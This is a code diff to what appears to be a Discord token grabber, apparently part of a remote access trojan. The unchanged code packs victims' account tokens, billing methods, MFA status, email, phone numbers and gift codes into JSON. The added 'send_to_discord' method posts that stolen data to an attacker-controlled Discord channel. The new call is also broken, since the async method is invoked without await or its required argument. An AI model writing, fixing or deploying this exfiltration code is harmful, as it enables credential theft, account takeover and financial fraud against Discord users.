@@ -211,6 +211,50 @@ class fetch_tokens:
 
                 final_to_return.append(embed)
             else:
-                #final_to_return.append(f'Username: {username} ({user_id})\nToken: {token}\nNitro: {nitro}\nBilling: {payment_methods if payment_methods != "" else "None"}\nMFA: {mfa}\nEmail: {email if email != None else "None"}\nPhone: {phone if phone != None else "None"}\nHQ Guilds: {hq_guilds}\nGift codes: {codes}')
                 final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment_methods if payment_methods != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
+        
+        # Send results to Discord bot
+        self.send_to_discord(final_to_return, raw_data)
+        
         return final_to_return
+
+    async def send_to_discord(self, results, raw_data, ctx):
+        try:
+            # Import the bot token from the main file
+            from donkratsource import bot
+            
+            # Get the category ID from the main file
+            category_id = bot.category_id
+            
+            # Find the channel to send to
+            for guild in bot.guilds:
+                for channel in guild.channels:
+                    if channel.category_id == category_id and isinstance(channel, discord.TextChannel):
+                        if raw_data:
+                            # Send raw data
+                            for result in results:
+                                if len(result) > 2000:
+                                    # Split long messages
+                                    chunks = [result[i:i+2000] for i in range(0, len(result), 2000)]
+                                    for chunk in chunks:
+                                        await channel.send(f"```json\n{chunk}\n```")
+                                else:
+                                    await channel.send(f"```json\n{result}\n```")
+                        else:
+                            # Send embeds
+                            for embed in results:
+                                await channel.send(embed=embed)
+                        break
+        except Exception as e:
+            # If sending fails, send via command context
+            if raw_data:
+                for result in results:
+                    if len(result) > 2000:
+                        chunks = [result[i:i+2000] for i in range(0, len(result), 2000)]
+                        for chunk in chunks:
+                            await ctx.send(f"```json\n{chunk}\n```")
+                    else:
+                        await ctx.send(f"```json\n{result}\n```")
+            else:
+                for embed in results:
+                    await ctx.send(embed=embed)
